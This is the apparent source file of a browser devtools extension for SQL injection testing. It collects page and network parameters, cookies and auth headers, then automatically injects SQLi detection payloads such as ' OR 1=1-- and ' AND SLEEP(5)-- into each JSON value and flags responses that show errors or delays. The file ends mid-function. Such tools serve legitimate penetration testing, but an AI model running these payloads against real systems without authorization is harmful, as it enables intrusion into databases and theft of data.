/**
 * SQLiBar – Page parameter scanner, network param aggregator, JSON explorer
 */
(function (global) {
    "use strict";

// =====================================================================
// 1) PAGE PARAMETER SCANNER
// =====================================================================
let pageParams = []; // { name, value, source, type }

function renderPageParamList() {
    const box = document.getElementById("pageParamList");
    const stats = document.getElementById("pageParamStats");
    if (!box) return;

    if (!pageParams.length) {
        box.innerHTML = '<div class="param-empty">' + (typeof t === "function" ? t("page.empty") : "Scan the page to find form fields, hidden inputs, query params & cookies.") + '</div>';
        if (stats) stats.textContent = "";
        return;
    }

    if (stats) stats.textContent = "(" + pageParams.length + ")";

    box.innerHTML = pageParams.map((p, i) => {
        const badgeClass = p.type || "query";
        const val = p.value != null && p.value !== "" ? escapeHtml(String(p.value).substring(0, 40)) : "";
        return '<div class="param-item" data-idx="' + i + '">' +
            '<span class="param-badge ' + badgeClass + '">' + escapeHtml(p.type || "?") + '</span>' +
            '<span class="param-name">' + escapeHtml(p.name) + '</span>' +
            '<span class="param-val" title="' + escapeHtml(String(p.value || "")) + '">' + val + '</span>' +
            '<span class="param-src">' + escapeHtml(p.source || "") + '</span>' +
            '<button class="btn-secondary param-to-url" data-idx="' + i + '" title="An URL anhängen">URL</button>' +
            '<button class="btn-secondary param-to-body" data-idx="' + i + '" title="In Body">Body</button>' +
            '<button class="btn-secondary param-to-payload" data-idx="' + i + '" title="Als Payload">PL</button>' +
        '</div>';
    }).join("");

    box.querySelectorAll(".param-to-url").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            const p = pageParams[parseInt(btn.dataset.idx, 10)];
            if (!p) return;
            appendParamToUrl(p.name, p.value || "1");
            log("Param → URL: " + p.name);
        });
    });
    box.querySelectorAll(".param-to-body").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            const p = pageParams[parseInt(btn.dataset.idx, 10)];
            if (!p) return;
            appendParamToBody(p.name, p.value || "1");
            log("Param → Body: " + p.name);
        });
    });
    box.querySelectorAll(".param-to-payload").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            const p = pageParams[parseInt(btn.dataset.idx, 10)];
            if (!p) return;
            if (customPayload) customPayload.value = p.name + "=" + (p.value || "");
            log("Param → Payload: " + p.name);
        });
    });
}

function appendParamToUrl(name, value) {
    const input = urlInput;
    if (!input) return;
    let url = input.value.trim();
    if (!url) return;
    try {
        const u = new URL(url);
        u.searchParams.set(name, value);
        input.value = u.toString();
        if (requestUrl) requestUrl.value = input.value;
    } catch (e) {
        const sep = url.includes("?") ? "&" : "?";
        input.value = url + sep + encodeURIComponent(name) + "=" + encodeURIComponent(value);
        if (requestUrl) requestUrl.value = input.value;
    }
}

function appendParamToBody(name, value) {
    const ta = document.getElementById("testerBody");
    if (!ta) return;
    const cur = ta.value.trim();
    if (cur.startsWith("{") || cur.startsWith("[")) {
        try {
            const obj = JSON.parse(cur || "{}");
            if (typeof obj === "object" && obj !== null && !Array.isArray(obj)) {
                obj[name] = value;
                ta.value = JSON.stringify(obj, null, 2);
                const oj = document.getElementById("optBodyJson");
                if (oj) oj.checked = true;
                return;
            }
        } catch (e) { /* fall through */ }
    }
    if (cur) {
        ta.value = cur + "&" + encodeURIComponent(name) + "=" + encodeURIComponent(value);
    } else {
        ta.value = encodeURIComponent(name) + "=" + encodeURIComponent(value);
    }
    const of = document.getElementById("optBodyForm");
    if (of) of.checked = true;
}

document.getElementById("scanPageParams")?.addEventListener("click", () => {
    const includeLinks = document.getElementById("scanIncludeLinks")?.checked ?? true;
    const includeCookies = document.getElementById("scanIncludeCookies")?.checked ?? true;
    const includeHidden = document.getElementById("scanIncludeHidden")?.checked ?? true;

    const code = `
(function() {
const params = [];
const seen = new Set();

function add(name, value, source, type) {
    if (!name || typeof name !== "string") return;
    name = name.trim();
    if (!name) return;
    const key = type + "|" + name.toLowerCase();
    if (seen.has(key)) return;
    seen.add(key);
    params.push({ name, value: value == null ? "" : String(value), source: source || "", type: type || "query" });
}

try {
    const sp = new URLSearchParams(location.search);
    sp.forEach((v, k) => add(k, v, "location.search", "query"));
} catch (e) {}

document.querySelectorAll("form").forEach((form, fi) => {
    const formId = form.id || form.name || ("form#" + fi);
    form.querySelectorAll("input, select, textarea").forEach(el => {
        const name = el.name || el.id;
        if (!name) return;
        const type = (el.type || el.tagName).toLowerCase();
        const isHidden = type === "hidden";
        if (isHidden && !${includeHidden}) return;
        add(name, el.value, formId, isHidden ? "hidden" : "form");
    });
});

document.querySelectorAll("input[name], select[name], textarea[name]").forEach(el => {
    if (el.closest("form")) return;
    const type = (el.type || "").toLowerCase();
    if (type === "hidden" && !${includeHidden}) return;
    add(el.name, el.value, "standalone", type === "hidden" ? "hidden" : "form");
});

if (${includeLinks}) {
    document.querySelectorAll("a[href]").forEach(a => {
        try {
            const href = a.getAttribute("href") || "";
            if (!href.includes("?")) return;
            const u = new URL(href, location.href);
            u.searchParams.forEach((v, k) => add(k, v, "link: " + (a.textContent || "").trim().substring(0, 30), "link"));
        } catch (e) {}
    });
}

document.querySelectorAll("[data-id], [data-user], [data-page], [data-item], [data-product], [data-param]").forEach(el => {
    Array.from(el.attributes).forEach(attr => {
        if (attr.name.startsWith("data-") && attr.value) {
            const key = attr.name.replace(/^data-/, "").replace(/-/g, "_");
            add(key, attr.value, "data-attr", "form");
        }
    });
});

if (${includeCookies} && document.cookie) {
    document.cookie.split(";").forEach(part => {
        const eq = part.indexOf("=");
        if (eq === -1) return;
        const n = part.slice(0, eq).trim();
        const v = part.slice(eq + 1).trim();
        if (n) add(n, v, "document.cookie", "cookie");
    });
}

return JSON.stringify(params);
})()
    `;

    browser.devtools.inspectedWindow.eval(code, (result, isException) => {
        if (isException || result == null) {
            log("Page-Scan fehlgeschlagen: " + (isException && isException.value ? isException.value : "unbekannt"));
            return;
        }
        try {
            pageParams = JSON.parse(result) || [];
            const order = { hidden: 0, form: 1, query: 2, link: 3, cookie: 4 };
            pageParams.sort((a, b) => (order[a.type] ?? 9) - (order[b.type] ?? 9) || a.name.localeCompare(b.name));
            renderPageParamList();
            log("Page-Scan: " + pageParams.length + " Parameter gefunden");
        } catch (e) {
            log("Page-Scan Parse-Fehler: " + e.message);
        }
    });
});

document.getElementById("clearPageParams")?.addEventListener("click", () => {
    pageParams = [];
    renderPageParamList();
    log("Page-Parameter geleert");
});



// =====================================================================
// 2) NETWORK PARAMETER AGGREGATOR (mit Request-Zugehörigkeit)
// =====================================================================
const netParamMap = new Map();

function collectParamsFromEntry(entry) {
    if (!entry) return;
    const rid = entry._id;
    let pathHint = "";
    try {
        const u = new URL(entry.url);
        pathHint = entry.method + " " + u.pathname;
        u.searchParams.forEach((v, k) => {
            upsertNetParam(k, v, "query", pathHint, rid, entry.url);
        });
    } catch (e) {}

    const body = entry.reqBody || "";
    if (body) {
        if (body.includes("=") && !body.trim().startsWith("{") && !body.trim().startsWith("[")) {
            try {
                const sp = new URLSearchParams(body);
                sp.forEach((v, k) => upsertNetParam(k, v, "body", entry.method + " body", rid, entry.url));
            } catch (e) {
                body.split("&").forEach(part => {
                    const eq = part.indexOf("=");
                    if (eq > 0) {
                        try {
                            const k = decodeURIComponent(part.slice(0, eq).replace(/\+/g, " "));
                            const v = decodeURIComponent(part.slice(eq + 1).replace(/\+/g, " "));
                            upsertNetParam(k, v, "body", entry.method + " body", rid, entry.url);
                        } catch (e2) {}
                    }
                });
            }
        }
        if (body.trim().startsWith("{") || body.trim().startsWith("[")) {
            try {
                const obj = JSON.parse(body);
                collectJsonKeys(obj, "", (path, val) => {
                    const leaf = path.split(".").pop() || path;
                    upsertNetParam(leaf, typeof val === "object" ? JSON.stringify(val) : String(val), "json", "JSON " + path, rid, entry.url);
                });
            } catch (e) {}
        }
    }

    const hdr = entry.reqHeaders || "";
    hdr.split("\n").forEach(line => {
        const m = line.match(/^\s*Cookie\s*:\s*(.+)$/i);
        if (m) {
            m[1].split(";").forEach(part => {
                const eq = part.indexOf("=");
                if (eq > 0) {
                    const n = part.slice(0, eq).trim();
                    const v = part.slice(eq + 1).trim();
                    if (n) upsertNetParam(n, v, "cookie", "Cookie header", rid, entry.url);
                }
            });
        }
        const hm = line.match(/^\s*(X-[\w-]+|Authorization|Api-Key|X-Api-Key|X-Auth-Token)\s*:\s*(.+)$/i);
        if (hm) {
            upsertNetParam(hm[1].trim(), hm[2].trim().substring(0, 60), "header", "Request header", rid, entry.url);
        }
    });
}

function upsertNetParam(name, value, type, source, requestId, url) {
    if (!name) return;
    name = String(name).trim();
    if (!name) return;
    const key = type + "|" + name.toLowerCase();
    const existing = netParamMap.get(key);
    if (existing) {
        existing.count = (existing.count || 1) + 1;
        if (value && !existing.value) existing.value = String(value);
        if (requestId != null) {
            if (!existing.requestIds) existing.requestIds = new Set();
            existing.requestIds.add(requestId);
        }
        if (url) {
            if (!existing.urls) existing.urls = new Set();
            existing.urls.add(url);
        }
        // keep last source
        if (source) existing.source = source;
        return;
    }
    const requestIds = new Set();
    if (requestId != null) requestIds.add(requestId);
    const urls = new Set();
    if (url) urls.add(url);
    netParamMap.set(key, {
        name,
        value: value != null ? String(value) : "",
        type: type || "query",
        source: source || "",
        count: 1,
        requestIds,
        urls
    });
}

function collectJsonKeys(obj, prefix, cb) {
    if (obj === null || obj === undefined) return;
    if (typeof obj !== "object") {
        if (prefix) cb(prefix, obj);
        return;
    }
    if (Array.isArray(obj)) {
        obj.forEach((item, i) => collectJsonKeys(item, prefix ? prefix + "[" + i + "]" : "[" + i + "]", cb));
        return;
    }
    Object.keys(obj).forEach(k => {
        const path = prefix ? prefix + "." + k : k;
        const v = obj[k];
        if (v !== null && typeof v === "object") {
            collectJsonKeys(v, path, cb);
        } else {
            cb(path, v);
        }
    });
}

function shortUrl(u) {
    if (!u) return "";
    try {
        const x = new URL(u);
        return x.pathname + (x.search ? "?" + x.searchParams.toString().substring(0, 40) : "");
    } catch (e) {
        return String(u).substring(0, 50);
    }
}

function renderNetParamList() {
    const box = document.getElementById("netParamList");
    const stats = document.getElementById("netParamStats");
    if (!box) return;

    const filter = (document.getElementById("netParamSearch")?.value || "").trim().toLowerCase();
    const typeFilter = document.getElementById("netParamTypeFilter")?.value || "all";
    const onlySelected = document.getElementById("netParamOnlySelected")?.checked;
    const selectedEntry = selectedNetIndex >= 0 ? networkEntries[selectedNetIndex] : null;

    let items = Array.from(netParamMap.values());
    if (typeFilter !== "all") {
        items = items.filter(p => p.type === typeFilter);
    }
    if (onlySelected && selectedEntry && selectedEntry._id != null) {
        items = items.filter(p => p.requestIds && p.requestIds.has(selectedEntry._id));
    }
    if (filter) {
        items = items.filter(p =>
            p.name.toLowerCase().includes(filter) ||
            (p.value || "").toLowerCase().includes(filter) ||
            (p.type || "").toLowerCase().includes(filter) ||
            (p.source || "").toLowerCase().includes(filter)
        );
    }

    items.sort((a, b) => (b.count || 0) - (a.count || 0) || a.name.localeCompare(b.name));

    if (stats) stats.textContent = "(" + netParamMap.size + (filter || typeFilter !== "all" || onlySelected ? ", shown " + items.length : "") + ")";

    if (!items.length) {
        const emptyMsg = netParamMap.size
            ? (typeof t === "function" ? t("net.noMatch") : "No match for filter.")
            : (typeof t === "function" ? t("net.paramsEmpty") : "Parameters from captured requests appear here automatically.");
        box.innerHTML = '<div class="param-empty">' + emptyMsg + "</div>";
        return;
    }

    box.innerHTML = items.map((p) => {
        const val = p.value ? escapeHtml(String(p.value).substring(0, 36)) : "";
        const reqCount = p.requestIds ? p.requestIds.size : 0;
        // show affiliation: source + number of linked requests
        let srcLabel = p.source || "";
        if (reqCount > 1) srcLabel += " · " + reqCount + " reqs";
        // first linked URL short
        let linkHint = "";
        if (p.urls && p.urls.size) {
            const first = p.urls.values().next().value;
            linkHint = shortUrl(first);
        }
        const title = escapeHtml([p.source, linkHint, reqCount + " request(s)"].filter(Boolean).join(" | "));
        return '<div class="param-item" title="' + title + '">' +
            '<span class="param-badge ' + p.type + '">' + escapeHtml(p.type) + '</span>' +
            '<span class="param-name">' + escapeHtml(p.name) + '</span>' +
            '<span class="param-val" title="' + escapeHtml(p.value || "") + '">' + val + '</span>' +
            '<span class="param-src netp-goto" data-rid="' + (p.requestIds && p.requestIds.size ? [...p.requestIds][0] : "") + '" style="cursor:pointer;text-decoration:underline dotted" title="Zum Request springen">' +
                escapeHtml(srcLabel || linkHint || "") +
                (p.count > 1 && reqCount <= 1 ? " ×" + p.count : "") +
            '</span>' +
            '<button class="btn-secondary netp-url" data-name="' + escapeHtml(p.name) + '" data-val="' + escapeHtml(p.value || "1") + '">URL</button>' +
            '<button class="btn-secondary netp-body" data-name="' + escapeHtml(p.name) + '" data-val="' + escapeHtml(p.value || "1") + '">Body</button>' +
            '<button class="btn-secondary netp-pl" data-name="' + escapeHtml(p.name) + '" data-val="' + escapeHtml(p.value || "") + '">PL</button>' +
        '</div>';
    }).join("");

    box.querySelectorAll(".netp-url").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            appendParamToUrl(btn.dataset.name, btn.dataset.val || "1");
            log("Net-Param → URL: " + btn.dataset.name);
        });
    });
    box.querySelectorAll(".netp-body").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            appendParamToBody(btn.dataset.name, btn.dataset.val || "1");
            log("Net-Param → Body: " + btn.dataset.name);
        });
    });
    box.querySelectorAll(".netp-pl").forEach(btn => {
        btn.addEventListener("click", (ev) => {
            ev.stopPropagation();
            if (customPayload) customPayload.value = btn.dataset.name + "=" + (btn.dataset.val || "");
            log("Net-Param → Payload: " + btn.dataset.name);
        });
    });
    // Klick auf Source → zum Request springen
    box.querySelectorAll(".netp-goto").forEach(el => {
        el.addEventListener("click", (ev) => {
            ev.stopPropagation();
            const rid = parseInt(el.dataset.rid, 10);
            if (!rid) return;
            const idx = networkEntries.findIndex(e => e._id === rid);
            if (idx < 0) { log("Request nicht mehr in Liste"); return; }
            selectedNetIndex = idx;
            showNetworkDetails(idx);
            renderNetworkList();
            renderSelectedRequestParams();
            // scroll request into view
            const item = networkList?.querySelector(`.network-item[data-idx="${idx}"]`);
            if (item) item.scrollIntoView({ block: "nearest" });
            log((typeof t === "function" ? t("net.jumpedToRequest") : "Jumped to request") + " (#" + rid + ")");
        });
    });
}

document.getElementById("clearNetParams")?.addEventListener("click", () => {
    netParamMap.clear();
    renderNetParamList();
    renderSelectedRequestParams();
    renderNetworkList();
    log("Network-Parameter geleert");
});

document.getElementById("netParamSearch")?.addEventListener("input", () => renderNetParamList());
document.getElementById("netParamTypeFilter")?.addEventListener("change", () => renderNetParamList());
document.getElementById("netParamOnlySelected")?.addEventListener("change", () => renderNetParamList());



// =====================================================================
// 4) JSON / NESTED BODY EXPLORER
// =====================================================================
let selectedJsonPath = "";
let selectedJsonValue = "";

function buildJsonTreeHtml(obj, prefix, depth) {
    prefix = prefix || "";
    depth = depth || 0;
    if (obj === null) return '<span class="jv">null</span>';
    if (typeof obj !== "object") {
        const s = typeof obj === "string" ? JSON.stringify(obj) : String(obj);
        return '<span class="jv">' + escapeHtml(s.substring(0, 80)) + '</span>';
    }
    if (Array.isArray(obj)) {
        if (!obj.length) return '<span class="jv">[]</span>';
        let html = "";
        obj.forEach((item, i) => {
            const path = prefix ? prefix + "[" + i + "]" : "[" + i + "]";
            html += '<div style="padding-left:' + (depth * 12) + 'px">';
            html += '<span class="jd">├</span> <span class="jk" data-path="' + escapeHtml(path) + '" data-val="' + escapeHtml(typeof item === "object" ? "" : String(item)) + '">[' + i + ']</span>: ';
            html += buildJsonTreeHtml(item, path, depth + 1);
            html += '</div>';
        });
        return html;
    }
    const keys = Object.keys(obj);
    if (!keys.length) return '<span class="jv">{}</span>';
    let html = "";
    keys.forEach(k => {
        const path = prefix ? prefix + "." + k : k;
        const v = obj[k];
        html += '<div style="padding-left:' + (depth * 12) + 'px">';
        html += '<span class="jd">├</span> <span class="jk" data-path="' + escapeHtml(path) + '" data-val="' + escapeHtml(v !== null && typeof v === "object" ? "" : String(v ?? "")) + '">' + escapeHtml(k) + '</span>: ';
        html += buildJsonTreeHtml(v, path, depth + 1);
        html += '</div>';
    });
    return html;
}

function showJsonExplorer(text) {
    const box = document.getElementById("jsonExplorerBox");
    const tree = document.getElementById("jsonTree");
    const hint = document.getElementById("jsonPathHint");
    if (!box || !tree) return;

    selectedJsonPath = "";
    selectedJsonValue = "";
    if (hint) hint.textContent = "";

    const t = (text || "").trim();
    if (!t) {
        box.style.display = "none";
        return;
    }
    try {
        const obj = JSON.parse(t);
        tree.innerHTML = buildJsonTreeHtml(obj);
        box.style.display = "block";

        tree.querySelectorAll(".jk").forEach(el => {
            el.addEventListener("click", () => {
                selectedJsonPath = el.dataset.path || "";
                selectedJsonValue = el.dataset.val || "";
                if (hint) {
                    hint.innerHTML = 'Selected: <code style="color:#fbbf24">' + escapeHtml(selectedJsonPath) + '</code>' +
                        (selectedJsonValue ? ' = <span style="color:#94a3b8">' + escapeHtml(selectedJsonValue.substring(0, 60)) + '</span>' : "");
                }
                tree.querySelectorAll(".jk").forEach(x => x.style.background = "");
                el.style.background = "#3b3b1a";
            });
        });
        log("JSON Explorer: keys parsed");
    } catch (e) {
        tree.innerHTML = '<span style="color:#f87171">Kein gültiges JSON: ' + escapeHtml(e.message) + '</span>';
        box.style.display = "block";
    }
}

document.getElementById("parseJsonBodyBtn")?.addEventListener("click", () => {
    const body = document.getElementById("testerBody")?.value || "";
    showJsonExplorer(body);
});

document.getElementById("jsonExplorerClose")?.addEventListener("click", () => {
    const box = document.getElementById("jsonExplorerBox");
    if (box) box.style.display = "none";
});

document.getElementById("jsonToPayload")?.addEventListener("click", () => {
    if (!selectedJsonPath) {
        log("Kein JSON-Key ausgewählt");
        return;
    }
    const leaf = selectedJsonPath.replace(/\[(\d+)\]/g, "").split(".").filter(Boolean).pop() || selectedJsonPath;
    if (customPayload) {
        customPayload.value = leaf + "=" + (selectedJsonValue || "1");
    }
    log("JSON → Payload: " + leaf);
});

document.getElementById("jsonToUrl")?.addEventListener("click", () => {
    if (!selectedJsonPath) {
        log("Kein JSON-Key ausgewählt");
        return;
    }
    const leaf = selectedJsonPath.replace(/\[(\d+)\]/g, "").split(".").filter(Boolean).pop() || selectedJsonPath;
    appendParamToUrl(leaf, selectedJsonValue || "1");
    log("JSON → URL: " + leaf);
});

document.getElementById("jsonCopyPath")?.addEventListener("click", () => {
    if (!selectedJsonPath) {
        log("Kein JSON-Key ausgewählt");
        return;
    }
    navigator.clipboard.writeText(selectedJsonPath);
    log("JSON-Path kopiert: " + selectedJsonPath);
});

document.getElementById("testerBody")?.addEventListener("blur", () => {
    const t = (document.getElementById("testerBody")?.value || "").trim();
    if ((t.startsWith("{") || t.startsWith("[")) && document.getElementById("jsonExplorerBox")?.style.display === "block") {
        showJsonExplorer(t);
    }
});

// =====================================================================
// 5) JSON KEYS SQLi MASS-TEST
// =====================================================================
const JSON_DETECTION_PAYLOADS = [
    { name: "Single Quote", payload: "'" },
    { name: "OR 1=1", payload: "' OR 1=1--" },
    { name: "AND SLEEP(5)", payload: "' AND SLEEP(5)--" },
    { name: "ExtractValue", payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--" },
    { name: "UpdateXML", payload: "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--" },
    { name: "CONVERT MSSQL", payload: "' AND 1=CONVERT(int,@@version)--" },
];

let jsonTestAbort = false;

/** Collect leaf (or all scalar) paths from a JSON value */
function collectJsonLeafPaths(obj, prefix, leafOnly, out) {
    out = out || [];
    if (obj === null || obj === undefined) {
        if (prefix) out.push({ path: prefix, value: obj, type: "null" });
        return out;
    }
    const ty = typeof obj;
    if (ty !== "object") {
        if (prefix) out.push({ path: prefix, value: obj, type: ty });
        return out;
    }
    if (Array.isArray(obj)) {
        if (!obj.length && prefix && !leafOnly) {
            out.push({ path: prefix, value: [], type: "array" });
        }
        obj.forEach((item, i) => {
            const p = prefix ? prefix + "[" + i + "]" : "[" + i + "]";
            collectJsonLeafPaths(item, p, leafOnly, out);
        });
        return out;
    }
    const keys = Object.keys(obj);
    if (!keys.length && prefix && !leafOnly) {
        out.push({ path: prefix, value: {}, type: "object" });
    }
    keys.forEach((k) => {
        const p = prefix ? prefix + "." + k : k;
        collectJsonLeafPaths(obj[k], p, leafOnly, out);
    });
    return out;
}

/** Deep-clone and APPEND payload to ONE value only.
 *  - Keys are never touched
 *  - Only the value at `path` gets: originalValue + payload
 *  - All other fields stay unchanged
 */
function setJsonPathValue(root, path, payload) {
    const clone = JSON.parse(JSON.stringify(root));
    if (!path) return clone;

    const tokens = [];
    const re = /([^[.\]]+)|\[(\d+)\]/g;
    let m;
    while ((m = re.exec(path)) !== null) {
        if (m[1] !== undefined) tokens.push(m[1]);
        else tokens.push(parseInt(m[2], 10));
    }
    if (!tokens.length) return clone;

    let cur = clone;
    for (let i = 0; i < tokens.length - 1; i++) {
        const tok = tokens[i];
        if (cur == null || typeof cur !== "object") return clone;
        cur = cur[tok];
    }
    const last = tokens[tokens.length - 1];
    if (cur != null && typeof cur === "object") {
        const old = cur[last];
        cur[last] = String(old == null ? "" : old) + String(payload);
    }
    return clone;
}

function fetchJsonTestOnce(url, method, body, headers, sendCookies) {
    return new Promise((resolve) => {
        try {
            browser.runtime.sendMessage(
                {
                    action: "fetchUrl",
                    url,
                    method,
                    headers: headers || {},
                    body: body && method !== "GET" && method !== "HEAD" ? body : undefined,
                    credentials: sendCookies ? "include" : "omit"
                },
                (r) => {
                    if (browser.runtime.lastError) {
                        resolve({ ok: false, error: browser.runtime.lastError.message });
                        return;
                    }
                    resolve(r || { ok: false, error: "Empty response" });
                }
            );
        } catch (e) {
            resolve({ ok: false, error: String(e && e.message || e) });
        }
    });
}

function renderJsonTestResults(results) {
    const box = document.getElementById("jsonTestResults");
    if (!box) return;

    if (!results.length) {
        box.innerHTML = `<div style="color:#888">${typeof t === "function" ? t("jsontest.noResults") : "Keine Ergebnisse."}</div>`;
        box.style.display = "block";
        return;
    }

    const interesting = results.filter((r) => {
        if (!r.ok) return true;
        const hasError = /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation|extractvalue|updatexml/i.test(r.body || "");
        return hasError || (r.ms > 4000);
    });

    const resultsLabel = typeof t === "function"
        ? t("jsontest.results", { total: results.length, interesting: interesting.length })
        : `${results.length} Tests · ${interesting.length} interessant`;

    let html = `<div style="font-size:12px;margin-bottom:6px">
        <b>${results.length}</b> ·
        <span style="color:${interesting.length ? "#fbbf24" : "#4ade80"}">${resultsLabel}</span>
    </div>`;

    html += `<div style="max-height:280px;overflow:auto;border:1px solid var(--border,#1a2f25);border-radius:6px;padding:6px 8px;font-size:11px;font-family:ui-monospace,monospace">`;

    results.forEach((r, i) => {
        const orig = r.originalValue == null ? "null" : String(r.originalValue);
        const origShort = orig.length > 28 ? orig.substring(0, 25) + "…" : orig;
        const plShort = (r.payloadName || r.payload || "").substring(0, 24);
        const label = `${r.path} = ${origShort} + ${plShort}${(r.payload || "").length > 24 ? "…" : ""}`;

        let color = "#888";
        let badge = "clean";
        if (!r.ok) {
            color = "#f87171";
            badge = "error";
        } else if (/sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation|extractvalue|updatexml/i.test(r.body || "")) {
            color = "#f87171";
            badge = "HIGH";
        } else if (r.ms > 4000) {
            color = "#fbbf24";
            badge = "TIME";
        }

        html += `<div style="padding:4px 0;border-bottom:1px solid #1a2f25;display:flex;gap:8px;align-items:center;flex-wrap:wrap">
            <span style="color:${color};font-weight:600;min-width:48px">[${badge}]</span>
            <span style="flex:1;word-break:break-all" title="${escapeHtml(r.path + ' | orig: ' + orig + ' | payload: ' + (r.payload || ''))}">${escapeHtml(label)}</span>
            <span style="color:#666">${r.status || "-"} · ${r.ms}ms · ${(r.body || "").length}B</span>
            <button class="btn-secondary jsont-load-btn" data-idx="${i}" style="font-size:10px;padding:2px 6px">→ Body</button>
        </div>`;
    });

    html += `</div>`;
    box.innerHTML = html;
    box.style.display = "block";

    box.querySelectorAll(".jsont-load-btn").forEach((btn) => {
        btn.addEventListener("click", () => {
            const r = results[parseInt(btn.dataset.idx, 10)];
            if (!r) return;
            const ta = document.getElementById("testerBody");
            if (ta && r.injectedBody) {
                ta.value = r.injectedBody;
                const oj = document.getElementById("optBodyJson");
                if (oj) oj.checked = true;
            }
            if (r.ok && typeof renderResponseView === "function") {
                renderResponseView(
                    document.getElementById("testerResponse"),
                    r.status, "", [], r.body || ""
                );
            }
            if (typeof analyzeSqliResponse === "function") {
                analyzeSqliResponse(r.body || "", r.status, (r.body || "").length, r.ms);
            }
            log((typeof t === "function" ? t("jsontest.loaded") : "JSON-Key-Test geladen:") + " " + r.path);
        });
    });
}

async function runJsonKeysSqliTest() {
    const btn = document.getElementById("testAllJsonKeysBtn");
    const abortBtn = document.getElementById("jsonTestAbortBtn");
    const progress = document.getElementById("jsonTestProgress");
    const resultsBox = document.getElementById("jsonTestResults");

    const baseUrl = (document.getElementById("urlInput")?.value || "").trim();
    if (!baseUrl) {
        log(typeof t === "function" ? t("jsontest.noUrl") : "Keine URL vorhanden", "warn");
        return;
    }

    const bodyText = (document.getElementById("testerBody")?.value || "").trim();
    if (!bodyText || !(bodyText.startsWith("{") || bodyText.startsWith("["))) {
        log(typeof t === "function" ? t("jsontest.noJson") : "Kein gültiges JSON im Body", "warn");
        return;
    }

    let root;
    try {
        root = JSON.parse(bodyText);
    } catch (e) {
        log((typeof t === "function" ? t("jsontest.noJson") : "Kein gültiges JSON:") + " " + e.message, "warn");
        return;
    }

    const leafOnly = document.getElementById("jsonTestLeafOnly")?.checked ?? true;
    const leaves = collectJsonLeafPaths(root, "", leafOnly, []);
    if (!leaves.length) {
        log(typeof t === "function" ? t("jsontest.noKeys") : "Keine testbaren JSON-Keys gefunden", "warn");
        return;
    }

    const useCurrentPayload = document.getElementById("jsonTestUsePayload")?.checked ?? false;
    let payloads = [];
    if (useCurrentPayload) {
        const p = (document.getElementById("customPayload")?.value || "").trim();
        if (!p) {
            log(typeof t === "function" ? t("jsontest.emptyPayload") : "Aktueller Payload ist leer", "warn");
            return;
        }
        payloads = [{ name: "Custom", payload: p }];
    } else {
        payloads = JSON_DETECTION_PAYLOADS;
    }

    const method = (document.getElementById("testerMethod")?.value || "POST").toUpperCase();
    const sendCookies = document.getElementById("optSendCookies")?.checked ?? true;
    const sendHeaders = document.getElementById("optSendHeaders")?.checked ?? true;
    const headerText = document.getElementById("testerHeaders")?.value || "";
    const headers = {};
    if (sendHeaders) {
        headerText.split("\n").forEach((line) => {
            const parts = line.split(":");
            if (parts.length > 1) {
                const key = parts.shift().trim();
                if (key && key.toLowerCase() !== "cookie") headers[key] = parts.join(":").trim();
            }
        });
    }
    const hasCT = Object.keys(headers).some((k) => k.toLowerCase() === "content-type");
    if (!hasCT) headers["Content-Type"] = "application/json";

    jsonTestAbort = false;
    if (btn) btn.disabled = true;
    if (abortBtn) abortBtn.style.display = "inline-block";
    const total = leaves.length * payloads.length;
    if (progress) {
        progress.style.display = "block";
        progress.textContent = typeof t === "function"
            ? t("jsontest.starting", { total })
            : `Starte… 0 / ${total}  (${leaves.length} Keys × ${payloads.length} Payloads)`;
    }
    if (resultsBox) resultsBox.style.display = "none";

    showJsonExplorer(bodyText);
    log(`JSON-Key-Test: ${leaves.length} Values einzeln (Payload anhängen), ${payloads.length} Payload(s)`);

    const allResults = [];
    let done = 0;

    // Jeder Value einzeln: pro Request wird NUR an diesen einen Value angehängt
    for (const leaf of leaves) {
        if (jsonTestAbort) break;
        for (const p of payloads) {
            if (jsonTestAbort) break;

            let injectedObj;
            try {
                injectedObj = setJsonPathValue(root, leaf.path, p.payload);
            } catch (e) {
                allResults.push({
                    path: leaf.path,
                    originalValue: leaf.value,
                    payload: p.payload,
                    payloadName: p.name,
                    ok: false,
                    error: String(e.message || e),
                    status: 0,
                    body: "",
                    ms: 0,
                    injectedBody: ""
                });
                done++;
                continue;
            }
            const injectedBody = JSON.stringify(injectedObj);

            const start = performance.now();
            const resp = await fetchJsonTestOnce(baseUrl, method, injectedBody, headers, sendCookies);
            const ms = resp.ms || Math.round(performance.now() - start);

            allResults.push({
                path: leaf.path,
                originalValue: leaf.value,
                payload: p.payload,
                payloadName: p.name,
                ok: !!resp.ok,
                status: resp.status,
                body: resp.body || "",
                ms,
                error: resp.error,
                injectedBody
            });
            done++;

            if (progress) {
                const origHint = leaf.value == null ? "null" : String(leaf.value).substring(0, 20);
                progress.textContent = typeof t === "function"
                    ? t("jsontest.progress", { done, total, name: leaf.path })
                    : `Teste… ${done} / ${total}  (${leaf.path}=${origHint} + payload)`;
            }

            await new Promise((r) => setTimeout(r, 100));
        }
    }

    if (btn) btn.disabled = false;
    if (abortBtn) abortBtn.style.display = "none";
    if (progress) {
        progress.textContent = jsonTestAbort
            ? (typeof t === "function" ? t("jsontest.aborted", { done, total }) : `Abgebrochen nach ${done}/${total}`)
            : (typeof t === "function" ? t("jsontest.done", { done }) : `Fertig: ${done} Tests`);
    }

    renderJsonTestResults(allResults);

    const hits = allResults.filter(
        (r) => r.ok && /sql|syntax|mysql|postgres|oracle|mssql|sqlite|ORA-\d|unclosed quotation/i.test(r.body || "")
    ).length;
    log(
        typeof t === "function"
            ? t("jsontest.finished", { total: allResults.length, hits })
            : `JSON-Key-SQLi-Test fertig: ${allResults.length} Requests, ${hits} mögliche Treffer`,
        hits ? "warn" : "success"
    );
}

document.getElementById("testAllJsonKeysBtn")?.addEventListener("click", () => {
    runJsonKeysSqliTest();
});

document.getElementById("jsonTestAbortBtn")?.addEventListener("click", () => {
    jsonTestAbort = true;
